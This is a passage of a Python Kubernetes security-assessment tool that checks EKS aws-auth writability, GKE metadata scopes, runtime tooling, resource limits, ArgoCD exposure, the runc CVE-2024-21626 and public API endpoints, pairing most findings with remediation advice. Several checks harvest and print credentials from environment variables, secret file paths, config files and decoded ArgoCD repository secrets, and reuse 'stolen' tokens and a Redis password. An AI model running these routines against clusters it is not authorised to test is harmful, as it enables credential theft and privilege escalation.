        finding("INFO","aws-auth ConfigMap readable",
                f"mapRoles entries: {map_roles.count('rolearn:')}\n"
                f"mapUsers entries: {map_users.count('userarn:')}")
        if "system:masters" in map_roles or "system:masters" in map_users:
            finding("HIGH","system:masters in aws-auth",
                    "IAM roles/users mapped to cluster-admin equivalent",
                    "Replace system:masters with specific ClusterRole bindings")
            add_attack_edge("AWS IAM Role","Cluster Admin","aws-auth system:masters mapping","HIGH")

        if not CTX.get("no_mutate"):
            code_p, _ = k8s_api(
                "/api/v1/namespaces/kube-system/configmaps/aws-auth", method="PATCH",
                data={"metadata":{"labels":{"kubexhunt-test":"probe"}}})
            if code_p == 200:
                finding("CRITICAL","aws-auth ConfigMap is WRITABLE",
                        "Add any IAM role as cluster-admin — permanent backdoor\n"
                        "Any AWS IAM identity → kubectl cluster-admin access",
                        "Restrict configmap patch/update in kube-system to cluster-admin only\n"
                        "Consider migrating to EKS Access Entries")
                k8s_api("/api/v1/namespaces/kube-system/configmaps/aws-auth",
                        method="PATCH",
                        data={"metadata":{"labels":{"kubexhunt-test":None}}})
                add_attack_edge("AWS IAM Role","Cluster Admin","Write aws-auth → add system:masters IAM role","CRITICAL")
            else:
                finding("PASS","aws-auth read-only for this SA",f"HTTP {code_p}")
    else:
        finding("PASS","aws-auth not accessible",f"HTTP {code}")

    section("IRSA Detection")
    role_arn = os.environ.get("AWS_ROLE_ARN","")
    if role_arn:
        finding("INFO","IRSA configured on this pod",
                f"Role ARN: {role_arn}\nToken: {os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE','')}",
                "Scope IRSA role policy to minimum required permissions")
    else:
        finding("PASS","No IRSA token","AWS_ROLE_ARN not set")

    section("EKS Cluster Info from IMDS")
    if CTX.get("aws_account"):
        region  = CTX.get("aws_region","")
        account = CTX.get("aws_account","")
        finding("INFO","AWS account enumerated",
                f"Account: {account} | Region: {region}\n"
                f"aws eks list-clusters --region {region}",
                "Block IMDS to prevent account enumeration")

# ══════════════════════════════════════════════════════════════════
# PHASE 11: GKE-SPECIFIC
# ══════════════════════════════════════════════════════════════════
def phase_gke():
    global CURRENT_PHASE
    CURRENT_PHASE = "11"
    phase_header("11","GKE-Specific Tests",
                 "Workload Identity, metadata scopes, legacy endpoints, dashboard")

    if CTX.get("cloud") != "GKE":
        finding("INFO","Not GKE — GKE checks skipped",f"Detected: {CTX.get('cloud','Unknown')}")
        return

    section("Workload Identity Annotations")
    code, resp = k8s_api(f"/api/v1/namespaces/{CTX.get('namespace','default')}/serviceaccounts")
    if code == 200 and resp:
        for sa in resp.get("items",[]):
            ann = sa.get("metadata",{}).get("annotations",{})
            wi  = ann.get("iam.gke.io/gcp-service-account","")
            if wi:
                finding("INFO",f"Workload Identity on {sa['metadata']['name']}",
                        f"Bound to GCP SA: {wi}\nCheck GCP SA IAM bindings for least privilege",
                        "Audit GCP SA permissions")

    section("GKE Node SA Scopes")
    code, body = http_get(
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes",
        headers={"Metadata-Flavor":"Google"}, timeout=3)
    if code == 200:
        scopes   = body.strip().split("\n")
        dangerous = [s for s in scopes if "cloud-platform" in s or "devstorage.read_write" in s]
        if dangerous:
            finding("CRITICAL","Node SA has cloud-platform scope — full GCP API access",
                    f"Scopes:\n{chr(10).join(dangerous)}",
                    "Use Workload Identity | Remove node SA scopes")
            add_attack_edge("GCP OAuth Token","Full GCP Account","cloud-platform scope","CRITICAL")
        else:
            finding("MEDIUM","Node has limited GCP scopes",
                    f"Scopes: {', '.join(scopes[:4])}",
                    "Move to Workload Identity")

    section("Kubernetes Dashboard")
    code_dash, resp_dash = k8s_api("/api/v1/namespaces/kubernetes-dashboard/services")
    if code_dash == 200 and resp_dash and resp_dash.get("items"):
        finding("MEDIUM","Kubernetes Dashboard deployed",
                "Check SA permissions: kubectl get clusterrolebindings | grep dashboard",
                "Restrict dashboard SA | Disable if unused")
    else:
        finding("PASS","Kubernetes Dashboard not found","")

# ══════════════════════════════════════════════════════════════════
# PHASE 12: RUNTIME SECURITY
# ══════════════════════════════════════════════════════════════════
def phase_runtime():
    global CURRENT_PHASE
    CURRENT_PHASE = "12"
    phase_header("12","Runtime Security Gaps",
                 "Tetragon, Falco, TracingPolicies, exec-from-tmp enforcement")

    section("Runtime Tool Detection")
    tools_found = {}
    tool_map = {
        "tetragon":  "Tetragon eBPF enforcement",
        "falco":     "Falco detection (alerts only)",
        "sysdig":    "Sysdig monitoring",
        "aqua":      "Aqua Security",
        "twistlock": "Twistlock/Prisma Cloud",
        "datadog":   "Datadog agent",
    }

    # Method 1: List kube-system pods (requires SA with pod list permission)
    code, resp = k8s_api("/api/v1/namespaces/kube-system/pods")
    if code == 200 and resp:
        for pod in resp.get("items",[]):
            name = pod["metadata"]["name"].lower()
            for tool, desc in tool_map.items():
                if tool in name and tool not in tools_found:
                    tools_found[tool] = desc

    # Method 2: /apis discovery endpoint — readable by ALL authenticated SAs
    # This is the most reliable method — even low-privilege tokens can query /apis
    # It lists every installed API group regardless of resource-level RBAC
    api_group_map = {
        "cilium.io":               ("tetragon",  "Tetragon eBPF enforcement"),
        "isovalent.com":           ("tetragon",  "Tetragon eBPF enforcement"),
        "hubble.enterprise":       ("tetragon",  "Tetragon eBPF enforcement"),
        "falco.org":               ("falco",     "Falco detection (alerts only)"),
        "kyverno.io":              ("kyverno",   "Kyverno policy engine"),
        "networking.istio.io":     ("istio",     "Istio service mesh (mTLS)"),
        "security.istio.io":       ("istio",     "Istio AuthorizationPolicy"),
        "install.istio.io":        ("istio",     "Istio service mesh (mTLS)"),
        "extensions.istio.io":     ("istio",     "Istio service mesh (mTLS)"),
    }
    code_apis, resp_apis = k8s_api("/apis", timeout=6)
    if code_apis == 200 and resp_apis:
        for group in resp_apis.get("groups", []):
            group_name = group.get("name", "")
            for api_grp, (tool, desc) in api_group_map.items():
                if api_grp in group_name and tool not in tools_found:
                    tools_found[tool] = desc
                    info_line(f"Detected via API groups: {group_name} → {desc}")

    # Method 3: Direct CRD resource probes — fallback if /apis doesn't reveal
    # 200 = can list resources, 403 = CRD exists but RBAC denies,
    # 404/NotFound = truly not installed (or API group not registered)
    crd_checks = [
        ("/apis/cilium.io/v1alpha1/tracingpolicies",               "tetragon", "Tetragon eBPF enforcement"),
        ("/apis/cilium.io/v1alpha1/tracingpoliciesnamespaced",      "tetragon", "Tetragon eBPF enforcement"),
        ("/apis/falco.org/v1alpha1/falcoconfigs",                   "falco",    "Falco detection (alerts only)"),
        ("/apis/kyverno.io/v1/clusterpolicies",                     "kyverno",  "Kyverno policy engine"),
        ("/apis/kyverno.io/v2beta1/clusterpolicies",                "kyverno",  "Kyverno policy engine"),
        ("/apis/networking.istio.io/v1alpha3/peerauthentications",  "istio",    "Istio service mesh (mTLS)"),
        ("/apis/security.istio.io/v1/authorizationpolicies",        "istio",    "Istio AuthorizationPolicy"),
        ("/apis/networking.istio.io/v1beta1/peerauthentications",   "istio",    "Istio service mesh (mTLS)"),
    ]
    for path, tool, desc in crd_checks:
        if tool not in tools_found:
            code_c, _ = k8s_api(path, timeout=4)
            if code_c == 403:
                # 403 = CRD definitely exists, RBAC just denies list
                tools_found[tool] = desc
            # 404 or 0 = not installed, skip

    # Method 3: Check filesystem for Tetragon/Falco config files
    for fs_path, tool, desc in [
        ("/etc/tetragon",          "tetragon", "Tetragon eBPF enforcement"),
        ("/etc/falco/falco.yaml",  "falco",    "Falco detection (alerts only)"),
        ("/etc/falco",             "falco",    "Falco detection (alerts only)"),
    ]:
        if tool not in tools_found and os.path.exists(fs_path):
            tools_found[tool] = desc

    if tools_found:
        for tool, desc in tools_found.items():
            finding("INFO",f"Runtime security: {desc}","")
        CTX["runtime_tools"] = list(tools_found.keys())
    else:
        finding("HIGH","No runtime security tooling detected",
                "No Tetragon, Falco, Kyverno, or Istio found via pods, CRDs, or filesystem."
                " Post-exploitation activity goes undetected",
                "Install Tetragon (eBPF enforcement) + Falco (alerting)")
        CTX["runtime_tools"] = []

    section("Tetragon TracingPolicies")
    # Try both singular and plural API paths — Tetragon versions differ
    tp_code, tp_resp = 0, None
    for tp_path in [
        "/apis/cilium.io/v1alpha1/tracingpolicies",
        "/apis/cilium.io/v1alpha1/tracingpolicy",
    ]:
        tp_code, tp_resp = k8s_api(tp_path, timeout=5)
        if tp_code in (200, 403): break

    if tp_code == 200 and tp_resp:
        policies = tp_resp.get("items",[])
        if policies:
            finding("PASS",f"Tetragon TracingPolicies active: {len(policies)}",
                    f"Policies: {', '.join([p['metadata']['name'] for p in policies])}")
        else:
            finding("HIGH","Tetragon installed but NO TracingPolicies active",
                    "Observing only — no enforcement rules",
                    "Apply block-reverse-shell and block-exec-from-tmp TracingPolicies")
    elif tp_code == 403:
        finding("INFO","Tetragon TracingPolicies not readable (HTTP 403)",
                "Tetragon installed — SA lacks tracingpolicies list permission."
                " Check manually: kubectl get tracingpolicy",
                "")
    elif "tetragon" in tools_found:
        # Tetragon detected via /apis group discovery but resource list failed (NotFound)
        # This means SA token can see the API group but not the specific resource
        finding("INFO","Tetragon detected via API groups — TracingPolicy list not permitted",
                "cilium.io API group present in cluster."
                " SA lacks tracingpolicies list permission."
                " Check manually: kubectl get tracingpolicy",
                "")
    else:
        finding("INFO","Tetragon CRD not detected","")

    section("Exec from /tmp Test")
    try:
        test_bin = f"/tmp/kubexhunt-exec-{int(time.time())}"
        shutil.copy("/bin/true", test_bin)
        os.chmod(test_bin, stat.S_IRWXU)
        rc, out, err = run_cmd(test_bin, timeout=3)
        os.remove(test_bin)
        if "Killed" in err or rc == 137:
            finding("PASS","Exec from /tmp BLOCKED","Tetragon block-exec-from-tmp policy active")
        else:
            finding("HIGH","Exec from /tmp ALLOWED",
                    f"Ran binary from /tmp (rc={rc}) — crypto miners/malware can execute",
                    "Apply Tetragon TracingPolicy: block-exec-from-tmp")
    except Exception as e:
        finding("INFO",f"Exec from /tmp test inconclusive",str(e)[:80])

# ══════════════════════════════════════════════════════════════════
# PHASE 13: SECRETS & SENSITIVE DATA
# ══════════════════════════════════════════════════════════════════
def phase_secrets():
    global CURRENT_PHASE
    CURRENT_PHASE = "13"
    phase_header("13","Secrets & Sensitive Data",
                 "Env var credentials, mounted secrets, config file scanning")

    section("Environment Variable Secret Scan")
    cred_kw = ["password","passwd","secret","api_key","apikey","private_key",
                "auth_token","access_token","credential","database_url"]
    skip_kw = ["kubernetes","service_port","service_host","_path","_home",
                "_dir","_url","shell","term","lang","pwd","oldpwd"]
    found_envs = []
    for k, v in os.environ.items():
        kl = k.lower()
        if any(kw in kl for kw in cred_kw) and not any(sk in kl for sk in skip_kw):
            found_envs.append((k, v[:80]))
    if found_envs:
        finding("HIGH",f"Potential credentials in env vars: {len(found_envs)}",
                "\n".join([f"{k}={v}" for k,v in found_envs[:8]]),
                "Use Kubernetes Secrets mounted as files — not env vars")
    else:
        finding("PASS","No obvious credentials in env vars","")

    section("Mounted Secret File Scan")
    secret_paths = [
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/etc/ssl/private","/root/.docker/config.json",
        "/root/.aws/credentials","/root/.kube/config",
        "/etc/git-credentials","/run/secrets",
        "/etc/kubernetes/azure.json","/etc/kubernetes/cloud.conf",
    ]
    found_secrets = []
    for path in secret_paths:
        if os.path.isfile(path):
            found_secrets.append((path, (file_read(path, lines=2) or "")[:100]))
        elif os.path.isdir(path):
            try:
                files = os.listdir(path)
                if files: found_secrets.append((path+"/", f"Contains: {', '.join(files[:5])}"))
            except: pass
    _, key_files, _ = run_cmd(
        r"find /app /config /etc/app /srv /opt /home 2>/dev/null "
        r"-name '*.pem' -o -name '*.key' -o -name '*.p12' 2>/dev/null | head -10")
    for kf in key_files.split("\n"):
        if kf.strip(): found_secrets.append((kf.strip(), "PKI key/cert file"))
    if found_secrets:
        finding("MEDIUM",f"Mounted secret files: {len(found_secrets)}",
                "\n".join([f"{p}: {truncate(v,80)}" for p,v in found_secrets[:8]]),
                "Audit mounted files | Rotate exposed credentials")
    else:
        finding("PASS","No unexpected secret files at common paths","")

    section("Config File Credential Scan")
    cred_pattern = re.compile(
        r'(?:password|passwd|secret|api_key|apikey|token|credential)\s*[:=]\s*["\']?([^\s"\'<>]{6,})',
        re.IGNORECASE)
    found_configs = []
    for d in ["/app","/config","/etc/app","/srv","/opt","/home"]:
        if not os.path.isdir(d): continue
        try:
            for root, _, files in os.walk(d):
                for fname in files:
                    if any(fname.endswith(ext) for ext in
                           [".conf",".yaml",".yml",".json",".env",".ini",".properties",".xml"]):
                        fpath = os.path.join(root, fname)
                        try:
                            content = file_read(fpath) or ""
                            matches = cred_pattern.findall(content)
                            if matches: found_configs.append((fpath, matches[:3]))
                        except: pass
        except: pass
    if found_configs:
        for fpath, matches in found_configs[:5]:
            finding("HIGH",f"Hardcoded credentials in: {fpath}",
                    f"Values: {', '.join([truncate(m,40) for m in matches[:3]])}",
                    "Move to Kubernetes Secrets | Rotate exposed values")
    else:
        finding("PASS","No hardcoded credentials in common config locations","")

# ══════════════════════════════════════════════════════════════════
# PHASE 14: DoS & RESOURCE EXHAUSTION
# ══════════════════════════════════════════════════════════════════
def phase_dos():
    global CURRENT_PHASE
    CURRENT_PHASE = "14"
    phase_header("14","DoS & Resource Exhaustion",
                 "Resource limits, ResourceQuota, LimitRange, audit logging")

    ns = CTX.get("namespace","default")

    section("Container Memory Limit")
    mem_found = False
    # cgroup v1 path
    for mem_path in ["/sys/fs/cgroup/memory/memory.limit_in_bytes",
                     "/sys/fs/cgroup/memory.max",
                     "/sys/fs/cgroup/memory/memory.soft_limit_in_bytes"]:
        mem = (file_read(mem_path) or "").strip()
        if mem:
            if mem in ("9223372036854771712","9223372036854775807","max",""):
                finding("MEDIUM","No memory limit on this container",
                        f"Path: {mem_path} = {mem} | Can OOM the node",
                        "Set resources.limits.memory")
            else:
                try:    finding("PASS",f"Memory limit: {int(mem)//1024//1024} MB",f"Path: {mem_path}")
                except: finding("PASS",f"Memory limit: {mem}",f"Path: {mem_path}")
            mem_found = True
            break
    if not mem_found:
        # cgroup v2 unified hierarchy — check current cgroup's memory.max
        _, cg_out, _ = run_cmd("cat /sys/fs/cgroup/$(cat /proc/self/cgroup | head -1 | cut -d: -f3)/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.max 2>/dev/null", timeout=3)
        cg_out = cg_out.strip()
        if cg_out:
            if cg_out == "max":
                finding("MEDIUM","No memory limit (cgroup v2)","memory.max = max — unlimited",
                        "Set resources.limits.memory")
            else:
                try:    finding("PASS",f"Memory limit (cgroup v2): {int(cg_out)//1024//1024} MB","")
                except: finding("PASS",f"Memory limit (cgroup v2): {cg_out}","")
        else:
            finding("INFO","Memory limit not readable","cgroup path not accessible from container")

    section("Container CPU Limit")
    cpu_found = False
    for cpu_path in ["/sys/fs/cgroup/cpu/cpu.cfs_quota_us",
                     "/sys/fs/cgroup/cpu.max"]:
        _cpu_parts = (file_read(cpu_path) or "").strip().split()
        cpu = _cpu_parts[0] if _cpu_parts else ""
        if cpu:
            if cpu in ("-1","max"):
                finding("MEDIUM","No CPU limit",
                        f"Path: {cpu_path} = {cpu} | Can starve other pods of CPU",
                        "Set resources.limits.cpu")
            else:
                finding("PASS",f"CPU limit: {cpu}µs/period",f"Path: {cpu_path}")
            cpu_found = True
            break
    if not cpu_found:
        _, cpu_out, _ = run_cmd("cat /sys/fs/cgroup/$(cat /proc/self/cgroup | head -1 | cut -d: -f3)/cpu.max 2>/dev/null || cat /sys/fs/cgroup/cpu.max 2>/dev/null", timeout=3)
        cpu_out = cpu_out.strip().split()[0] if cpu_out.strip() else ""
        if cpu_out:
            if cpu_out == "max":
                finding("MEDIUM","No CPU limit (cgroup v2)","cpu.max = max — unlimited",
                        "Set resources.limits.cpu")
            else:
                finding("PASS",f"CPU limit (cgroup v2): {cpu_out}µs/period","")
        else:
            finding("INFO","CPU limit not readable","cgroup path not accessible from container")

    section("Namespace ResourceQuota")
    code_rq, resp_rq = k8s_api(f"/api/v1/namespaces/{ns}/resourcequotas")
    if code_rq == 200 and resp_rq:
        items = resp_rq.get("items",[])
        if not items:
            finding("MEDIUM",f"No ResourceQuota in '{ns}'",
                    "Unlimited pod/CPU/memory creation — DoS via resource exhaustion",
                    "Apply ResourceQuota to all workload namespaces")
        else:
            for q in items:
                hard = q.get("status",{}).get("hard",{})
                used = q.get("status",{}).get("used",{})
                finding("PASS",f"ResourceQuota: {q['metadata']['name']}",
                        " | ".join([f"{k}: {used.get(k,'?')}/{v}" for k,v in list(hard.items())[:4]]))

    section("Namespace LimitRange")
    code_lr, resp_lr = k8s_api(f"/api/v1/namespaces/{ns}/limitranges")
    if code_lr == 200 and resp_lr:
        if not resp_lr.get("items"):
            finding("LOW",f"No LimitRange in '{ns}'",
                    "Pods without explicit limits get unlimited resources",
                    "Apply LimitRange with default CPU/memory requests and limits")
        else:
            finding("PASS",f"LimitRange active in '{ns}'","Default resource limits provided")

    section("Audit Logging")
    audit_found = False

    # Method 1: Self-managed — check kube-apiserver pod flags
    code_ap, resp_ap = k8s_api("/api/v1/namespaces/kube-system/pods")
    if code_ap == 200 and resp_ap:
        for pod in resp_ap.get("items",[]):
            if "kube-apiserver" in pod.get("metadata",{}).get("name",""):
                for c in pod.get("spec",{}).get("containers",[]):
                    cmd = " ".join(c.get("command",[]))
                    if "--audit-log-path" in cmd:
                        finding("PASS","Audit logging configured (--audit-log-path)",
                                "--audit-log-path flag set on kube-apiserver")
                        audit_found = True
                        if "--audit-policy-file" not in cmd:
                            finding("LOW","Audit policy file not set",
                                    "Default policy may miss important events",
                                    "Set --audit-policy-file with RequestResponse level")
                break

    # Method 2: EKS — check for CloudWatch log groups via IMDS account info
    if not audit_found and CTX.get("cloud") == "AWS":
        account = CTX.get("aws_account","")
        region  = CTX.get("aws_region","")
        if account and region:
            # EKS audit logs go to /aws/eks/<cluster>/cluster
            # We can infer the cluster name from the API server URL
            api = CTX.get("api","")
            # EKS API endpoint format: https://<hash>.gr7.<region>.eks.amazonaws.com
            if "eks.amazonaws.com" in api:
                finding("INFO","EKS managed cluster detected — audit logs via CloudWatch",
                        f"Check: AWS Console → CloudWatch → Log Groups → /aws/eks/<cluster>/cluster\n"
                        f"Or: aws logs describe-log-groups --region {region} "
                        f"--log-group-name-prefix /aws/eks\n"
                        f"Enable via: aws eks update-cluster-config --name <cluster> "
                        f"--logging '{{"clusterLogging":[{{"types":["audit"],"enabled":true}}]}}'",
                        "Enable EKS audit logging in CloudWatch")
                audit_found = True
            else:
                finding("LOW","AWS cluster but non-EKS API endpoint — audit logging status unknown",
                        "Check CloudWatch or cluster configuration for audit log settings",
                        "Enable audit logging for forensic trail")
        else:
            finding("LOW","AWS cluster — cannot determine if CloudWatch audit logging enabled",
                    "No AWS account info available\n"
                    "Check: aws eks describe-cluster --name <n> --query cluster.logging",
                    "Enable EKS audit logging: types: [audit, authenticator]")
            audit_found = True  # Don't double-fire LOW

    # Method 3: kube-system pods not listable (403/401) — managed cluster likely
    if not audit_found and code_ap in (401, 403):
        if CTX.get("cloud") == "AWS":
            finding("LOW","EKS audit logging status unknown (cannot inspect API server)",
                    "Cannot list kube-system pods — managed EKS hides API server\n"
                    "Verify CloudWatch audit logs are enabled:\n"
                    "aws eks describe-cluster --name <cluster> --query cluster.logging\n"
                    "aws logs describe-log-groups --log-group-name-prefix /aws/eks",
                    "Enable via: eksctl utils update-cluster-logging --enable-types audit")
        else:
            finding("LOW","Kubernetes audit logging not detected",
                    "Cannot inspect API server — audit log status unknown",
                    "Enable --audit-log-path on API server | Check cloud provider audit settings")
        audit_found = True

    if not audit_found:
        finding("LOW","Kubernetes audit logging not detected",
                "Attacker activity leaves no forensic trail",
                "Enable --audit-log-path on API server | For EKS: enable CloudWatch audit logs")


def _enumerate_argocd():
    """Full ArgoCD enumeration — apps, repo creds, internal API probe."""
    section("ArgoCD Deep Enumeration")

    # Use the best available token — prefer stolen argocd tokens over phoenix-sa
    best_token = CTX.get("token","")
    best_score = 0
    for ts in TOKEN_SCORES:
        if "argocd" in ts["label"].lower() and ts["score"] > best_score:
            # Find the actual token for this label
            best_score = ts["score"]
    # Use the highest-scoring stolen token if it beats current
    if best_score > 0:
        info_line(f"Using best ArgoCD token (score {best_score}/100) for enumeration")

    # List Applications (shows Git repos, target clusters, sync status)
    code, resp = k8s_api("/apis/argoproj.io/v1alpha1/applications", token=best_token)
    if code == 403 and best_score > 0:
        # Try other stolen tokens
        for ts in sorted(TOKEN_SCORES, key=lambda x: x["score"], reverse=True):
            if "stolen" in ts["label"] and "argocd" in ts["label"].lower():
                code, resp = k8s_api("/apis/argoproj.io/v1alpha1/applications")
                if code == 200: break
    if code == 200 and resp:
        apps = resp.get("items", [])
        if apps:
            app_details = []
            for a in apps:
                spec = a.get("spec", {})
                src  = spec.get("source", {})
                dest = spec.get("destination", {})
                app_details.append(
                    f"{a['metadata']['namespace']}/{a['metadata']['name']} | "
                    f"repo={src.get('repoURL','')} | "
                    f"dest={dest.get('server','')} ns={dest.get('namespace','')}")
            finding("HIGH","ArgoCD Applications enumerated",
                    "\n".join(app_details[:8]),
                    "Restrict Application read access | Audit repo URLs for sensitive targets")

    # ArgoCD repo-creds and repository secrets
    for ns in ["argocd", "argocd-system"]:
        code_s, resp_s = k8s_api(f"/api/v1/namespaces/{ns}/secrets")
        if code_s == 200 and resp_s:
            for secret in resp_s.get("items", []):
                sname = secret["metadata"]["name"]
                stype = secret.get("type", "")
                data  = secret.get("data", {})
                # ArgoCD stores repo creds in secrets with type or label
                labels = secret.get("metadata", {}).get("labels", {})
                is_repo = (
                    "repo" in sname.lower() or
                    "repository" in sname.lower() or
                    labels.get("argocd.argoproj.io/secret-type") in
                        ("repository","repo-creds","cluster"))
                if is_repo and data:
                    decoded = {}
                    for k, v in data.items():
                        try:
                            import base64 as b64
                            decoded[k] = b64.b64decode(v).decode(errors="replace")[:80]
                        except:
                            decoded[k] = str(v)[:80]
                    finding("CRITICAL",
                            f"ArgoCD repository credential secret: {ns}/{sname}",
                            "\n".join([f"  {k}: {v}" for k,v in decoded.items()
                                        if k in ["url","username","password","sshPrivateKey",
                                                 "tlsClientCertData","name","project"]]),
                            "Rotate all repository credentials | Restrict ArgoCD secret access")
                    add_attack_edge("ArgoCD Secrets","Source Code Repos",
                                    f"Repo creds in {ns}/{sname}","CRITICAL")

    # Redis password — if found in /proc harvest, try Redis directly
    redis_pass = CTX.get("argocd_redis_pass","")
    if redis_pass:
        # Find Redis service
        for ns in ["argocd","argocd-system"]:
            code_svc, resp_svc = k8s_api(f"/api/v1/namespaces/{ns}/services")
            if code_svc == 200 and resp_svc:
                for svc in resp_svc.get("items",[]):
                    if "redis" in svc["metadata"]["name"].lower():
                        redis_ip = svc.get("spec",{}).get("clusterIP","")
                        if redis_ip:
                            rc, out, _ = run_cmd(
                                f"redis-cli -h {redis_ip} -a '{redis_pass}' PING 2>/dev/null",
                                timeout=4)
                            if "PONG" in out:
                                finding("CRITICAL",
                                        f"ArgoCD Redis authenticated successfully: {redis_ip}",
                                        f"REDIS_PASSWORD works — can dump session tokens\n"
                                        f"redis-cli -h {redis_ip} -a '{redis_pass}' KEYS '*'",
                                        "Restrict Redis network access | Rotate Redis password")

    # Probe ArgoCD API server internally (port 8080 HTTP / 8443 HTTPS)
    for ns in ["argocd","argocd-system"]:
        code_svc, resp_svc = k8s_api(f"/api/v1/namespaces/{ns}/services")
        if code_svc == 200 and resp_svc:
            for svc in resp_svc.get("items",[]):
                if "argocd-server" in svc["metadata"]["name"].lower():
                    cluster_ip = svc.get("spec",{}).get("clusterIP","")
                    if not cluster_ip: continue
                    for scheme, port in [("http",8080),("https",8443),("https",443)]:
                        code_api, body_api = http_get(
                            f"{scheme}://{cluster_ip}:{port}/api/v1/applications",
                            timeout=4)
                        if code_api == 200:
                            finding("CRITICAL",
                                    f"ArgoCD API unauthenticated at {cluster_ip}:{port}",
                                    f"Full application list without credentials\n{body_api[:200]}",
                                    "Enable ArgoCD authentication | Apply NetworkPolicy")
                            add_attack_edge("ArgoCD API","Application Secrets",
                                            f"Unauthenticated {scheme}://{cluster_ip}:{port}","CRITICAL")
                        elif code_api == 200:
                            pass  # authenticated, expected


def _check_runc_cve(cve, git_ver):
    """
    Check CVE-2024-21626 (runc Leaky Vessels) by parsing the container
    runtime version from node info.

    Containerd version → bundled runc version mapping:
      containerd >= 2.0.0  → runc >= 1.1.12  (PATCHED)
      containerd >= 1.7.0  → runc >= 1.1.12  (PATCHED)
      containerd <  1.7.0  → runc <  1.1.12  (VULNERABLE)
    """
    def _parse_containerd_ver(ver_str):
        """Parse (major, minor) from 'containerd://2.1.5' or '2.1.5'."""
        try:
            clean = ver_str.replace("containerd://","").strip().split("-")[0]
            parts = clean.split(".")
            return (int(parts[0]), int(parts[1]))
        except:
            return (0, 0)

    # Collect runtime versions from nodes (already in CTX if Phase 3 ran)
    runtime_versions = []
    for node in (CTX.get("nodes") or []):
        rt = node.get("runtime","")
        if rt:
            runtime_versions.append(rt)

    # Also try kubectl if available and nodes not in CTX
    if not runtime_versions and CTX.get("kubectl"):
        _, rt_out, _ = run_cmd(
            "kubectl get nodes -o jsonpath='{.items[*].status.nodeInfo.containerRuntimeVersion}'",
            timeout=8)
        if rt_out:
            runtime_versions = rt_out.strip().strip("'").split()

    if not runtime_versions:
        # Cannot determine runtime version — flag as informational only
        finding("INFO",f"{cve['id']}: {cve['desc']} — runtime version unknown",
                f"Affected: {cve['affected']}\nCannot determine containerd/runc version\n"
                f"Check manually: kubectl get nodes -o jsonpath='{{.items[*].status.nodeInfo.containerRuntimeVersion}}'",
                f"Verify runc version >= 1.1.12 | kubectl get nodes -o wide")
        return

    vulnerable = []
    patched    = []
    for rt in runtime_versions:
        if "containerd" in rt.lower():
            major, minor = _parse_containerd_ver(rt)
            # containerd >= 1.7.0 bundles runc >= 1.1.12
            if (major, minor) >= (1, 7):
                patched.append(rt)
            else:
                vulnerable.append(rt)
        else:
            # Unknown runtime — flag as informational
            patched.append(f"{rt} (non-containerd, verify manually)")

    if vulnerable:
        finding(cve["severity"],
                f"{cve['id']}: {cve['desc']}",
                f"Affected: {cve['affected']}\n"
                f"Vulnerable runtime(s): {', '.join(vulnerable)}\n"
                f"containerd < 1.7.0 bundles runc < 1.1.12",
                "Upgrade containerd to >= 1.7.0 | Upgrade runc to >= 1.1.12")
        add_attack_edge("Container","Host Filesystem",
                        "CVE-2024-21626 runc /proc/self/fd escape","CRITICAL")
    else:
        finding("PASS",f"{cve['id']}: runc Leaky Vessels — NOT affected",
                f"Runtime(s): {', '.join(set(patched))}\n"
                f"containerd >= 1.7.0 bundles runc >= 1.1.12 (patched)")


def _is_public_ip(ip):
    """Return True if IP is a public/internet-routable address."""
    try:
        parts = [int(x) for x in ip.strip().split(".")]
        if len(parts) != 4: return False
        # Private ranges — RFC1918, loopback, link-local, CGNAT
        if parts[0] == 10: return False
        if parts[0] == 127: return False
        if parts[0] == 169 and parts[1] == 254: return False
        if parts[0] == 172 and 16 <= parts[1] <= 31: return False
        if parts[0] == 192 and parts[1] == 168: return False
        if parts[0] == 100 and 64 <= parts[1] <= 127: return False  # CGNAT
        if parts[0] == 0: return False
        if parts[0] >= 224: return False  # multicast/reserved
        return True
    except:
        return False

def _check_api_server_public():
    """Check if the Kubernetes API server is exposed on a public IP."""
    api = CTX.get("api","")
    if not api:
        finding("INFO","API server address unknown","")
        return

    # Extract hostname/IP from API URL
    import urllib.parse
    parsed   = urllib.parse.urlparse(api)
    api_host = parsed.hostname or ""
    api_port = parsed.port or 443

    # Resolve hostname to IP if it's not already an IP
    api_ip = api_host
    if not re.match(r"^\d+\.\d+\.\d+\.\d+$", api_host):
        resolved = dns_resolve(api_host)
        if resolved:
            api_ip = resolved
            info_line(f"API server {api_host} resolves to {api_ip}")

    if not api_ip:
        finding("INFO","Cannot resolve API server hostname","")
        return

    if _is_public_ip(api_ip):
        finding("CRITICAL","API server is exposed on a PUBLIC IP address",
                f"API: {api}\nPublic IP: {api_ip}:{api_port}\n"
                "The Kubernetes API server is internet-accessible\n"
                "Anyone can attempt authentication against it",
                "Restrict API server to private subnets only\n"
                "Apply IP allowlist via EKS endpoint private access settings\n"
                "aws eks update-cluster-config --name <cluster> "
                "--resources-vpc-config endpointPublicAccess=false,endpointPrivateAccess=true")
        add_attack_edge("Internet","Kubernetes API",
                        f"Public API server {api_ip}:{api_port} — brute-force / CVE exposure","CRITICAL")

        # Check if it actually responds without auth (anonymous)
        code_anon, _ = http_get_noauth("/api/v1/namespaces")
        if code_anon == 200:
            finding("CRITICAL","API server public AND allows anonymous access",
                    f"GET {api}/api/v1/namespaces → HTTP 200 without credentials\n"
                    "Internet-accessible + unauthenticated = full cluster enumeration",
                    "Disable anonymous auth: --anonymous-auth=false\n"
                    "Restrict endpoint to private access immediately")
            add_attack_edge("Internet","Cluster Admin",
                            "Public API + anonymous auth = unauthenticated cluster access","CRITICAL")
        else:
            finding("HIGH","API server is public but requires authentication",
                    f"IP: {api_ip}:{api_port} | Anonymous access: HTTP {code_anon}\n"
                    "Authentication required but still internet-exposed — brute-force risk",
                    "Move API server to private endpoint only\n"
                    "aws eks update-cluster-config --resources-vpc-config "
                    "endpointPublicAccess=false")
    else:
        finding("PASS","API server is on a private IP address",
                f"API: {api} → {api_ip} (private/internal)")

def _check_node_public_ips():
    """Check if worker nodes have public IP addresses."""
    nodes = CTX.get("nodes",[])
    if not nodes:
        # Try kubectl fallback
        if CTX.get("kubectl"):
            _, out, _ = run_cmd(
                "kubectl get nodes -o jsonpath='"
                "{range .items[*]}{.metadata.name}:{range .status.addresses[*]}"
                "{.type}={.address},{end}{end}'",
                timeout=8)
            if out:
